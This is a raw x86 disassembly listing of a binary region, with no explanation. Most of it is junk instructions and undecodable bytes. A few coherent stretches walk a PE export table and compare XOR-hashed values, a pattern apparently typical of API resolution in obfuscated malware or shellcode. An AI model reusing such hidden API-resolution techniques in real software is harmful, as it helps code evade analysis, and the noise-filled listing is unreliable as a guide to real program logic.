  40b3f0:	in     eax,dx
  40b3f1:	data16 jns 0x40b3be
  40b3f4:	and    al,BYTE PTR [edi-0x51]
  40b3f7:	iret   
  40b3f8:	push   es
  40b3f9:	xchg   esp,eax
  40b3fa:	daa    
  40b3fb:	xchg   ebp,eax
  40b3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3fd:	add    eax,ebp
  40b3ff:	imul   ebp,edi,0x1b701b43
  40b405:	add    DWORD PTR [edi+edi*1],0x7c
  40b409:	xor    eax,0x5f0df5bd
  40b40e:	mov    bh,0xe7
  40b410:	xor    DWORD PTR [edi],0x9
  40b413:	mov    ds:0x711e5c1d,al
  40b418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b419:	ror    DWORD PTR [eax],cl
  40b41b:	in     eax,0x0
  40b41d:	sub    ah,bl
  40b41f:	cmp    dl,BYTE PTR [ecx-0x19f595]
  40b425:	adc    DWORD PTR [edx+0x27],ebx
  40b428:	jge    0x40b3de
  40b42a:	(bad)  
  40b42b:	pop    ecx
  40b42c:	scas   eax,DWORD PTR es:[edi]
  40b42d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b42e:	or     DWORD PTR [edx+ecx*8-0x2f07ab35],ebp
  40b435:	pop    edx
  40b436:	or     DWORD PTR [ebx+0x3d3612e2],ebp
  40b43c:	adc    al,0xac
  40b43e:	stos   DWORD PTR es:[edi],eax
  40b43f:	es xchg esp,eax
  40b441:	rcr    BYTE PTR [edi+0x6e5481f4],0x3e
  40b448:	dec    edi
  40b449:	rcl    DWORD PTR [eax-0x6b],1
  40b44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b44d:	arpl   WORD PTR [eax+0x7b],sp
  40b450:	add    al,0x0
  40b452:	mov    WORD PTR ds:0x41e82655,ss
  40b458:	xor    ebx,DWORD PTR [esi]
  40b45a:	lods   eax,DWORD PTR ds:[esi]
  40b45b:	push   ebx
  40b45c:	(bad)  
  40b45d:	mov    al,0x38
  40b45f:	retf   0xb2ea
  40b462:	mov    ah,0xa1
  40b464:	fldenv [ecx+0x45]
  40b467:	add    DWORD PTR [ebx+0x3a2c4b5a],esi
  40b46d:	test   eax,0x2de1c864
  40b472:	mov    ebp,0x70356923
  40b477:	retf   
  40b478:	xor    esi,0x1c2d1181
  40b47e:	xchg   ecx,eax
  40b47f:	push   ds
  40b480:	scas   eax,DWORD PTR es:[edi]
  40b481:	popf   
  40b482:	stos   BYTE PTR es:[edi],al
  40b483:	gs jg  0x40b456
  40b486:	inc    ebx
  40b487:	jg     0x40b43f
  40b489:	xchg   ebx,eax
  40b48a:	add    edx,esp
  40b48c:	adc    bh,BYTE PTR [eax]
  40b48e:	xor    DWORD PTR [edx+esi*1-0x29],esp
  40b492:	xchg   esp,eax
  40b493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b494:	test   DWORD PTR [ebx+0x23],esi
  40b497:	into   
  40b498:	add    ecx,DWORD PTR [ecx]
  40b49a:	pop    edi
  40b49b:	sbb    al,BYTE PTR [ecx]
  40b49d:	rcl    DWORD PTR [edx+0x1f],1
  40b4a0:	cs inc esp
  40b4a2:	inc    eax
  40b4a3:	pop    ss
  40b4a4:	in     eax,0x26
  40b4a6:	or     eax,0x36ea4422
  40b4ab:	(bad)  
  40b4ac:	jl     0x40b4f5
  40b4ae:	es fwait
  40b4b0:	out    dx,al
  40b4b1:	or     BYTE PTR [edx-0x38682373],0xd7
  40b4b8:	push   di
  40b4ba:	ins    DWORD PTR es:[edi],dx
  40b4bb:	add    eax,DWORD PTR [esi-0x13f7bf20]
  40b4c1:	jne    0x40b4fe
  40b4c3:	call   0x23a1:0x5002b853
  40b4ca:	iret   
  40b4cb:	mov    ds:0x4fa54870,al
  40b4d0:	test   al,0x79
  40b4d2:	add    DWORD PTR [edx],ebx
  40b4d4:	arpl   WORD PTR [ecx+0x458bd44d],cx
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	fwait
  40b508:	cmc    
  40b509:	sub    bl,BYTE PTR [ecx-0x18]
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	call   0xa0c7:0x1572dc2
  40b51a:	jno    0x40b513
  40b51c:	enter  0xc8c1,0x8b
  40b520:	out    dx,al
  40b521:	inc    ebx
  40b522:	pop    esp
  40b523:	cld    
  40b524:	imul   ebp,DWORD PTR [esi-0x6b125f4],0xffffff86
  40b52b:	(bad)  
  40b52c:	sbb    al,0x2f
  40b52e:	jge    0x40b51b
  40b530:	pop    esp
  40b531:	jl     0x40b4e5
  40b533:	rcl    BYTE PTR [eax+edx*4],1
  40b536:	lods   eax,DWORD PTR ds:[esi]
  40b537:	fnstsw WORD PTR [eax+0x41980fee]
  40b53d:	(bad)  
  40b53f:	repnz mov bl,0x51
  40b542:	cmp    eax,0x855edc78
  40b547:	retf   0x6787
  40b54a:	ins    BYTE PTR es:[edi],dx
  40b54b:	add    DWORD PTR [ecx+edi*4+0x30],eax
  40b54f:	test   BYTE PTR [edi-0x6dd0abb7],bl
  40b555:	sahf   
  40b556:	push   ds
  40b557:	retf   0x8273
  40b55a:	mov    dh,0xa1
  40b55c:	and    eax,0x2c48669c
  40b561:	pop    ss
  40b562:	bound  esp,QWORD PTR [esi+0x5]
  40b565:	pop    ebp
  40b566:	lahf   
  40b567:	aas    
  40b568:	ins    DWORD PTR es:[edi],dx
  40b569:	jnp    0x40b50d
  40b56b:	sub    ah,0x13
  40b56e:	popf   
  40b56f:	rol    BYTE PTR [esi-0x27f77e34],1
  40b575:	(bad)  
  40b576:	cmc    
  40b577:	adc    eax,0x732f9c96
  40b57c:	ret    
  40b57d:	pop    ss
  40b57e:	jge    0x40b546
  40b580:	ss mov bh,0x93
  40b583:	xor    bl,BYTE PTR [eax+eax*1-0x58]
  40b587:	jbe    0x40b545
  40b589:	sbb    DWORD PTR [esi+ebp*8],eax
  40b58c:	retf   0x7385
  40b58f:	mov    esi,0xab6bc260
  40b594:	mov    DWORD PTR [esi-0x3af9138d],esp
  40b59a:	and    eax,0xd33d481c
  40b59f:	test   DWORD PTR [ecx],edx
  40b5a1:	xchg   DWORD PTR [edx+0x5fa47e21],edx
  40b5a7:	test   al,0xcf
  40b5a9:	push   eax
  40b5aa:	shr    BYTE PTR [eax+0x9],1
  40b5ad:	out    0x74,al
  40b5af:	jecxz  0x40b5a2
  40b5b1:	es aaa 
  40b5b3:	aam    0x5d
  40b5b5:	xor    DWORD PTR [esi-0x4d136214],0xffffff9d
  40b5bc:	sbb    BYTE PTR [edx-0x62],dh
  40b5bf:	xchg   esp,eax
  40b5c0:	retf   0x3c00
  40b5c3:	fistp  WORD PTR [ebx+0x5f0f3060]
  40b5c9:	aam    0x92
  40b5cb:	out    0x50,al
  40b5cd:	mov    ch,0xd3
  40b5cf:	mov    edi,0xce2c3d8c
  40b5d4:	scas   al,BYTE PTR es:[edi]
  40b5d5:	mov    dl,0xda
  40b5d7:	aas    
  40b5d8:	inc    ebp
  40b5d9:	add    al,0x74
  40b5db:	ficom  DWORD PTR [edi-0x4d]
  40b5de:	add    BYTE PTR [esi+eax*2+0x56],ah
  40b5e2:	test   al,0xfe
  40b5e4:	xchg   edi,eax
  40b5e5:	lods   al,BYTE PTR ds:[esi]
  40b5e6:	mov    edx,0x559e6ff0
  40b5eb:	in     eax,dx
  40b5ec:	nop
  40b5ed:	imul   BYTE PTR ds:0xef1d00f6
  40b5f3:	jae    0x40b5e4
  40b5f5:	(bad)  
  40b5f6:	cmp    al,0xcf
  40b5f8:	cli    
  40b5f9:	jmp    0xb55e:0x25b11766
  40b600:	jo     0x40b5ee
  40b602:	xor    eax,0xf15d3488
  40b607:	add    eax,ecx
  40b609:	rol    BYTE PTR [ebx],cl
  40b60b:	pop    ds
  40b60c:	icebp  
  40b60d:	data16 das 
  40b60f:	mov    bh,BYTE PTR ds:0xb1fa49b5
  40b615:	hlt    
  40b616:	and    ebp,edi
  40b618:	ret    0x9bb9
  40b61b:	(bad)  
  40b61c:	cli    
  40b61d:	and    BYTE PTR [edi+0x46bf4005],0x8
  40b624:	sub    al,0x54
  40b626:	ins    BYTE PTR es:[edi],dx
  40b627:	lahf   
  40b628:	xor    esp,DWORD PTR [ecx]
  40b62a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62b:	and    DWORD PTR [ecx],0xffffffef
  40b62e:	pop    esi
  40b62f:	push   ss
  40b630:	add    eax,0x28ca2374
  40b635:	js     0x40b664
  40b637:	dec    edi
  40b638:	inc    esp
  40b639:	test   DWORD PTR [ebx-0x6a2a1c31],0x78bc708d
  40b643:	dec    ebp
  40b644:	add    DWORD PTR [ebp+0x5a9b877a],0x65
  40b64b:	out    dx,al
  40b64c:	(bad)  
  40b64d:	mov    ds:0x8ab58674,eax
  40b652:	push   eax
  40b653:	imul   edi,DWORD PTR es:[ebx-0x4f],0x55
  40b658:	(bad)  [esi]
  40b65a:	xchg   esp,eax
  40b65b:	ror    DWORD PTR [eiz*4+0x7e2868fc],0x34
  40b663:	cmp    esi,ecx
  40b665:	jno    0x40b6cf
  40b667:	test   al,bl
  40b669:	xor    DWORD PTR [ebx-0x2cc48f87],0x41b580c9
  40b673:	or     dh,BYTE PTR [esp+eax*1-0x2a02b92e]
  40b67a:	or     al,0xcd
  40b67c:	inc    ecx
  40b67e:	neg    DWORD PTR [esi-0x1cb60130]
  40b684:	data16 imul BYTE PTR [eax-0xf]
  40b688:	xor    al,0xbf
  40b68a:	stos   BYTE PTR es:[edi],al
  40b68b:	cmp    ebp,eax
  40b68d:	fsubr  QWORD PTR [eax-0x4da83269]
  40b693:	loope  0x40b64c
  40b695:	sub    eax,0x388130ab
  40b69a:	inc    ebp
  40b69b:	mov    BYTE PTR [esi-0x2d],dl
  40b69e:	xchg   ebx,eax
  40b69f:	(bad)  
  40b6a0:	push   cs
  40b6a1:	sbb    ah,BYTE PTR [eax]
  40b6a3:	out    dx,eax
  40b6a4:	mov    ebp,0x17010c84
  40b6a9:	das    
  40b6aa:	mov    ch,0x18
  40b6ac:	mov    esp,0x45d1fd0f
  40b6b1:	or     cl,0x4f
  40b6b4:	(bad)  [ebx]
  40b6b6:	hlt    
  40b6b7:	dec    ebp
  40b6b8:	jb     0x40b70a
  40b6ba:	xchg   ecx,eax
  40b6bb:	je     0x40b6c2
  40b6bd:	jno    0x40b67d
  40b6bf:	sar    BYTE PTR [esi+0x7dca1754],1
  40b6c5:	hlt    
  40b6c6:	inc    ebx
  40b6c7:	add    ah,dl
  40b6c9:	mov    ebp,0xc2c7e444
  40b6ce:	sbb    dh,al
  40b6d0:	repz cmp BYTE PTR [ecx+0x47960544],0x1f
  40b6d8:	mov    ebx,0xba2dd21a
  40b6dd:	add    bl,cl
  40b6df:	inc    ebp
  40b6e0:	out    dx,al
  40b6e1:	(bad)  
  40b6e2:	sub    al,0x30
  40b6e4:	rol    BYTE PTR [ecx+esi*2],1
  40b6e7:	mov    WORD PTR [eax+0x5f604e21],gs
  40b6ed:	mov    esp,0xbcb5312
  40b6f2:	or     eax,0xdbdffd57
  40b6f7:	push   ebp
  40b6f8:	int3   
  40b6f9:	loopne 0x40b691
  40b6fb:	mov    eax,ds:0x70ed80a9
  40b700:	ficomp DWORD PTR [edi-0x1a]
  40b703:	cmp    al,0x7a
  40b705:	out    dx,eax
  40b706:	bound  esp,QWORD PTR [ebp-0x3e]
  40b709:	stos   DWORD PTR es:[edi],eax
  40b70a:	xchg   ebp,eax
  40b70b:	fstp   QWORD PTR [ebp+esi*1-0x270514b1]
  40b712:	retf   
  40b713:	mov    esp,0xab81b0a
  40b718:	in     al,0xda
  40b71a:	add    DWORD PTR ss:[edx+edi*2-0x7],ebp
  40b71f:	aaa    
  40b720:	ins    BYTE PTR es:[edi],dx
  40b721:	(bad)  
  40b722:	or     al,BYTE PTR [esp+edx*8-0x4851b2b8]
  40b729:	mov    dh,0x5f
  40b72b:	add    BYTE PTR [ebx+0x2f],dl
  40b72e:	mov    WORD PTR [edi+ebx*1+0x43aa702c],gs
  40b735:	xchg   ebp,eax
  40b736:	push   esp
  40b737:	les    edx,FWORD PTR [ebx-0x39]
  40b73a:	int3   
  40b73b:	inc    edi
  40b73c:	lock dec edi
  40b73e:	xor    eax,0x4b42dd3b
  40b743:	in     al,0x6f
  40b745:	gs mov ch,0x19
  40b748:	cmp    BYTE PTR [ebp-0x5c],al
  40b74b:	pop    ecx
  40b74c:	dec    ebx
  40b74d:	push   ebp
  40b74e:	js     0x40b761
  40b750:	test   DWORD PTR [ebx+0x70],0xa4be5bb0
  40b757:	fcomp  DWORD PTR [esi-0x2f8a01]
  40b75d:	jne    0x40b76b
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	cmp    al,0xef
  40b78c:	enter  0xb28a,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	pushf  
  40b797:	mov    esi,0x514b92f
  40b79c:	inc    edx
  40b79d:	fidivr DWORD PTR [esi-0x23348ed2]
  40b7a3:	mov    ch,0x42
  40b7a5:	push   ds
  40b7a6:	sub    al,bl
  40b7a8:	push   0xffffff9e
  40b7aa:	ss xor eax,0x3b088dc1
  40b7b0:	and    eax,0xdad2b8a0
  40b7b5:	aas    
  40b7b6:	and    bl,BYTE PTR gs:[ecx+0x1c12169]
  40b7bd:	xchg   edi,eax
  40b7be:	in     eax,dx
  40b7bf:	outs   dx,DWORD PTR ds:[esi]
  40b7c0:	dec    edi
  40b7c1:	mov    edx,0xb9098661
  40b7c6:	icebp  
  40b7c7:	scas   al,BYTE PTR es:[edi]
  40b7c8:	adc    DWORD PTR [esi+0x48e96bf2],ebx
  40b7ce:	mov    edi,0x857d545d
  40b7d3:	push   eax
  40b7d4:	xchg   ebx,eax
  40b7d5:	lock or DWORD PTR [edx+0x19adaa69],ebp
  40b7dc:	sbb    cl,bh
  40b7de:	add    eax,0xd9095bbb
  40b7e3:	mov    edx,tr7
  40b7e6:	add    eax,0xcfc497b8
  40b7eb:	shl    DWORD PTR [ecx-0x41],cl
  40b7ee:	enter  0x8a1,0x79
  40b7f2:	fwait
  40b7f3:	and    edx,esi
  40b7f5:	mov    dl,0x11
  40b7f8:	fdiv   QWORD PTR [esi+esi*2-0x6]
  40b7fc:	aaa    
  40b7fd:	sbb    cl,bh
  40b7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b800:	lea    eax,[esi+ebp*2-0x50d55e6]
  40b807:	call   0x51814225
  40b80c:	popf   
  40b80d:	push   edi
  40b80e:	mov    ds:0x72293948,eax
  40b813:	les    edi,FWORD PTR [ebx]
  40b815:	sub    eax,0xc05e3643
  40b81a:	dec    esi
  40b81b:	inc    edx
  40b81c:	aas    
  40b81d:	or     BYTE PTR [edi+0x60],ah
  40b820:	xchg   ebp,eax
  40b821:	repz or al,0x28
  40b824:	rcl    DWORD PTR [eax],0x63
  40b827:	jle    0x40b7d5
  40b829:	sbb    al,BYTE PTR [eax+0x3aac3636]
  40b82f:	outs   dx,DWORD PTR ds:[esi]
  40b830:	dec    edx
  40b831:	dec    edx
  40b832:	sub    al,0xc7
  40b834:	add    DWORD PTR [ebp+0x14056922],esp
  40b83a:	ret    
  40b83b:	int    0xe9
  40b83d:	adc    ebx,DWORD PTR [ebp+0x63]
  40b840:	mov    eax,ds:0xbf782c89
  40b845:	and    ch,BYTE PTR [esi-0x5eac19d9]
  40b84b:	ja     0x40b805
  40b84d:	dec    ecx
  40b84e:	push   edi
  40b84f:	sub    ebp,ebx
  40b851:	jns    0x40b836
  40b853:	int3   
  40b854:	(bad)  
  40b855:	cld    
  40b856:	outs   dx,BYTE PTR ds:[esi]
  40b857:	cmp    DWORD PTR [ebp-0x7ced2d01],edi
  40b85d:	add    BYTE PTR [esi+0x157b7ab4],bl
  40b863:	test   al,0xb5
  40b865:	outs   dx,BYTE PTR ds:[esi]
  40b866:	repnz pop eax
  40b868:	jns    0x40b7f5
  40b86a:	or     eax,0x9ef8b18a
  40b86f:	popa   
  40b870:	dec    edi
  40b871:	out    0xcf,eax
  40b873:	sbb    ah,BYTE PTR [edx]
  40b875:	adc    al,0xe6
  40b877:	sbb    al,0xfa
  40b879:	jmp    0x89cb:0xe59e4c8
  40b880:	(bad)  
  40b882:	push   cs
  40b883:	in     eax,0xf7
  40b885:	repnz repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b888:	jae    0x40b89d
  40b88a:	xchg   ebx,esi
  40b88c:	and    ah,BYTE PTR [esi+ebx*8-0x2f4b9cfd]
  40b893:	mov    al,0x8c
  40b895:	leave  
  40b896:	aad    0x9
  40b898:	pop    esp
  40b899:	and    DWORD PTR [esi+ecx*8],esi
  40b89c:	test   BYTE PTR [edx+esi*4-0x7516e40],0xd4
  40b8a4:	mov    al,0xc1
  40b8a6:	xchg   DWORD PTR [ebx+0x19],edx
  40b8a9:	jno    0x40b86c
  40b8ab:	repnz ins DWORD PTR es:[edi],dx
  40b8ad:	and    al,BYTE PTR [edx+0x44]
  40b8b0:	(bad)  
  40b8b1:	addr16 jbe 0x40b898
  40b8b4:	mov    ch,0x66
  40b8b6:	nop
  40b8b7:	jmp    0xa5a63716
  40b8bc:	fldenv [ecx+0x21ac349d]
  40b8c2:	mov    dl,0x7b
  40b8c4:	ins    BYTE PTR es:[edi],dx
  40b8c5:	retf   
  40b8c6:	push   0x67
  40b8c8:	out    dx,al
  40b8c9:	pop    esp
  40b8ca:	pop    ss
  40b8cb:	and    edi,DWORD PTR [edx]
  40b8cd:	jbe    0x40b8cc
  40b8cf:	mov    ebx,0x4573f28d
  40b8d4:	lods   al,BYTE PTR ds:[esi]
  40b8d5:	inc    eax
  40b8d6:	xchg   edx,eax
  40b8d7:	cli    
  40b8d8:	inc    ebx
  40b8d9:	ret    
  40b8da:	pop    esi
  40b8db:	sti    
  40b8dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8dd:	outs   dx,DWORD PTR ds:[esi]
  40b8de:	or     esi,DWORD PTR [ecx]
  40b8e0:	fsub   DWORD PTR [eax]
  40b8e2:	jnp    0x40b8a5
  40b8e4:	jecxz  0x40b8d4
  40b8e6:	lods   al,BYTE PTR ds:[esi]
  40b8e7:	xchg   ebp,eax
  40b8e8:	jnp    0x40b86d
  40b8ea:	ds inc eax
  40b8ec:	aad    0x34
  40b8ee:	cld    
  40b8ef:	xchg   esi,eax
  40b8f0:	or     eax,0x4c8a6424
  40b8f5:	mov    ds:0xde847e9d,al
  40b8fa:	add    BYTE PTR [ebx+0x78081515],al
  40b900:	clts   
  40b902:	xor    al,BYTE PTR [edx-0x45580c17]
  40b908:	js     0x40b8fe
  40b90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b90b:	popf   
  40b90c:	adc    ecx,DWORD PTR [esi-0x38]
  40b90f:	sub    ah,BYTE PTR [ecx+0x45]
  40b912:	cmp    ax,0x4e54
  40b916:	jae    0x40b8a3
  40b918:	fisubr WORD PTR [esi]
  40b91a:	iret   
  40b91b:	or     ecx,edi
  40b91d:	es add dh,dl
  40b920:	cs or  al,0xc6
  40b923:	out    dx,eax
  40b924:	mov    dl,BYTE PTR [eax-0x42]
  40b927:	cdq    
  40b928:	xor    ah,BYTE PTR [ecx-0x4d]
  40b92b:	inc    esi
  40b92c:	out    dx,al
  40b92d:	cmc    
  40b92e:	loop   0x40b98c
  40b930:	jns    0x40b9b1
  40b932:	rcr    esi,1
  40b934:	sub    dh,bl
  40b936:	ins    BYTE PTR es:[edi],dx
  40b937:	pop    edx
  40b938:	data16 xchg BYTE PTR [ebx-0x272dd613],dl
  40b93f:	xor    DWORD PTR [ecx],eax
  40b941:	mov    bl,0xa5
  40b943:	xchg   esi,eax
  40b944:	pop    edx
  40b945:	out    dx,eax
  40b946:	call   0xc7244562
  40b94b:	ret    0xdf79
  40b94e:	pop    edi
  40b94f:	inc    ebp
  40b950:	push   eax
  40b951:	jmp    0xf603:0x84741eae
  40b958:	or     al,BYTE PTR [ecx+0x1233fa66]
  40b95e:	mov    WORD PTR [ecx],cx
  40b961:	fsubp  st(3),st
  40b963:	sub    DWORD PTR ds:0x3ffe6071,esp
  40b969:	inc    eax
  40b96a:	sub    eax,0x46cf1f2b
  40b96f:	xor    al,0xbe
  40b971:	popf   
  40b972:	cld    
  40b973:	jl     0x40b995
  40b975:	jae    0xb67c0992
  40b97b:	dec    esi
  40b97c:	mov    esp,0x688e0b33
  40b981:	sti    
  40b982:	mov    BYTE PTR ds:0xdd3a72b2,al
  40b988:	push   cs
  40b989:	xor    ch,0x3c
  40b98c:	je     0x40b911
  40b98e:	pop    ecx
  40b98f:	xchg   ebp,eax
  40b990:	xchg   esp,eax
  40b991:	cwde   
  40b992:	cmp    al,0x88
  40b994:	mov    bh,0x5d
  40b996:	mov    dl,0xf5
  40b998:	sar    BYTE PTR [edx-0x51618cd3],0xf5
  40b99f:	nop
  40b9a0:	push   ebp
  40b9a1:	sub    eax,0xca33cec5
  40b9a6:	sbb    BYTE PTR [edi+0x71],ah
  40b9a9:	add    al,0x12
  40b9ab:	dec    ebx
  40b9ac:	jno    0x40b994
  40b9ae:	loop   0x40b941
  40b9b0:	sti    
  40b9b1:	jo     0x40b996
  40b9b3:	or     dl,BYTE PTR [ecx]
  40b9b5:	jmp    0x40b9a6
  40b9b7:	add    ebp,ecx
  40b9b9:	stos   DWORD PTR es:[edi],eax
  40b9ba:	cmp    al,0xe
  40b9bc:	fmul   DWORD PTR [esp+ebp*4+0x3c]
  40b9c0:	or     bh,BYTE PTR [esi]
  40b9c2:	loopne 0x40b9bd
  40b9c4:	or     edi,DWORD PTR [ebx]
  40b9c6:	push   edx
  40b9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9c8:	mov    ch,cl
  40b9ca:	jl     0x40b99b
  40b9cc:	add    BYTE PTR [esp+ecx*8+0x712fb092],0xde
  40b9d4:	inc    ebx
  40b9d5:	mov    edx,0xf8cc8033
  40b9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9db:	lods   al,BYTE PTR ds:[esi]
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x7697a808],eax
  40ba0f:	bound  edi,QWORD PTR [si-0x3]
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	mov    BYTE PTR [edx+0x62],0xbc
  40ba1d:	push   edx
  40ba1e:	sbb    DWORD PTR [edx],esp
  40ba20:	arpl   WORD PTR [ecx+0x1a],bx
  40ba23:	pop    ebx
  40ba24:	add    edi,ebp
  40ba26:	enter  0x2cff,0x44
  40ba2a:	cdq    
  40ba2b:	das    
  40ba2c:	xchg   esp,eax
  40ba2d:	ja     0x40ba5e
  40ba2f:	pop    edi
  40ba30:	outs   dx,DWORD PTR ds:[esi]
  40ba31:	pop    edx
  40ba32:	xchg   esi,eax
  40ba33:	scas   eax,DWORD PTR es:[edi]
  40ba34:	sub    al,bl
  40ba36:	test   esi,0x6ff93a97
  40ba3c:	clc    
  40ba3d:	push   esp
  40ba3e:	add    ebp,DWORD PTR [ecx]
  40ba40:	mov    BYTE PTR [ebp+0x5591b7e8],0xef
  40ba47:	cs pop ss
  40ba49:	popa   
  40ba4a:	adc    ecx,DWORD PTR [esi+0x2363652a]
  40ba50:	mov    fs,WORD PTR [eax+0x5c]
  40ba53:	or     DWORD PTR [ebp-0x3c],eax
  40ba56:	imul   edi,DWORD PTR [esi+0x71d3458c],0xc80c1f6f
  40ba60:	mov    eax,ds:0x7d05fcf2
  40ba65:	pop    edx
  40ba66:	out    dx,al
  40ba67:	(bad)  
  40ba68:	std    
  40ba69:	xlat   BYTE PTR ds:[ebx]
  40ba6a:	push   es
  40ba6b:	in     al,dx
  40ba6c:	and    BYTE PTR [ebx],ch
  40ba6e:	adc    BYTE PTR [esi+esi*1],bl
  40ba71:	loop   0x40ba71
  40ba73:	adc    ecx,eax
  40ba75:	imul   eax,edi,0xfffffff5
  40ba78:	or     al,0x19
  40ba7a:	jo     0x40baa7
  40ba7c:	or     eax,0x3ab0bebe
  40ba81:	(bad)  
  40ba82:	cdq    
  40ba83:	in     eax,dx
  40ba84:	jne    0x40baa2
  40ba86:	pop    esi
  40ba87:	sbb    al,BYTE PTR [ebx+esi*8+0x7c3061fb]
  40ba8e:	jge    0x40ba38
  40ba90:	xor    edi,DWORD PTR [esi]
  40ba92:	push   ds
  40ba93:	adc    DWORD PTR [ebx+0x47],edx
  40ba96:	cmp    eax,0x1a91787a
  40ba9b:	mov    ecx,0xcad147b1
  40baa0:	jb     0x40ba87
  40baa2:	xchg   ecx,eax
  40baa3:	int    0x69
  40baa5:	or     ch,BYTE PTR [edx+eiz*4]
  40baa8:	sbb    eax,0xe399b2db
  40baad:	and    eax,0xfd573b4f
  40bab2:	inc    ebx
  40bab3:	repnz mov al,ds:0xc7ea02a9
  40bab9:	scas   eax,DWORD PTR es:[edi]
  40baba:	clc    
  40babb:	adc    DWORD PTR [edx+0x45],ebx
  40babe:	cmp    BYTE PTR [esi+0x14b847a0],bl
  40bac4:	imul   esp,DWORD PTR [edx+0xa],0xfffffff8
  40bac8:	push   ebx
  40bac9:	cs jo  0x40ba9c
  40bacc:	sti    
  40bacd:	sub    DWORD PTR [esi+0xcbda19a],ecx
  40bad3:	ret    
  40bad4:	outs   dx,DWORD PTR ds:[esi]
  40bad5:	fwait
  40bad6:	daa    
  40bad7:	cld    
  40bad8:	mov    ds:0x9c0b880f,eax
  40badd:	add    eax,0xd0744678
  40bae2:	mov    DWORD PTR [esi],ebx
  40bae4:	adc    dl,BYTE PTR [edi+0x2bfe2321]
  40baea:	push   ecx
  40baeb:	cmp    ecx,DWORD PTR ds:[edx+0x4b11a5e4]
  40baf2:	adc    esi,DWORD PTR [eax-0x701912e0]
  40baf8:	lahf   
  40baf9:	add    eax,0x8e05efbe
  40bafe:	test   al,0x58
  40bb00:	stos   DWORD PTR es:[edi],eax
  40bb01:	mov    ebx,DWORD PTR [esi-0x7940b303]
  40bb07:	lock xchg edx,eax
  40bb09:	jb     0x40bb79
  40bb0b:	jle    0x40baaa
  40bb0d:	and    bh,0x85
  40bb10:	int3   
  40bb11:	jecxz  0x40bb3a
  40bb13:	mov    dl,0xc8
  40bb15:	data16 cmp al,0x56
  40bb18:	test   eax,0x24a60e1f
  40bb1d:	cmp    BYTE PTR [ecx+0x4f7f37ac],dl
  40bb23:	in     al,dx
  40bb24:	push   edi
  40bb25:	inc    esp
  40bb26:	iret   
  40bb27:	push   0xffffffad
  40bb29:	sbb    DWORD PTR [ebp-0x34],ebp
  40bb2c:	dec    ebp
  40bb2d:	push   0x5f
  40bb2f:	int3   
  40bb30:	jle    0x40bb38
  40bb32:	daa    
  40bb33:	mov    cl,0x4
  40bb35:	inc    ecx
  40bb36:	cmp    BYTE PTR [esi+eax*4+0x2469a0df],ah
  40bb3d:	sbb    al,0x6a
  40bb3f:	daa    
  40bb40:	popa   
  40bb41:	sbb    al,0x53
  40bb43:	inc    ebx
  40bb44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb45:	call   0x582e:0x2084575
  40bb4c:	mov    dh,0x3
  40bb4e:	jb     0x40baf8
  40bb50:	sar    DWORD PTR [ecx+0x276c8801],0xdb
  40bb57:	mul    BYTE PTR [esi]
  40bb59:	sub    eax,0x8ab425cc
  40bb5e:	rcl    eax,cl
  40bb60:	inc    eax
  40bb61:	mov    edi,0xc4df26f
  40bb66:	das    
  40bb67:	add    DWORD PTR [edx+edi*8+0x34fa3a50],eax
  40bb6e:	add    ah,dh
  40bb70:	in     eax,0x49
  40bb72:	inc    ebx
  40bb73:	test   al,0xed
  40bb75:	in     al,0x41
  40bb77:	(bad)  
  40bb78:	mov    ebx,0x947d03fa
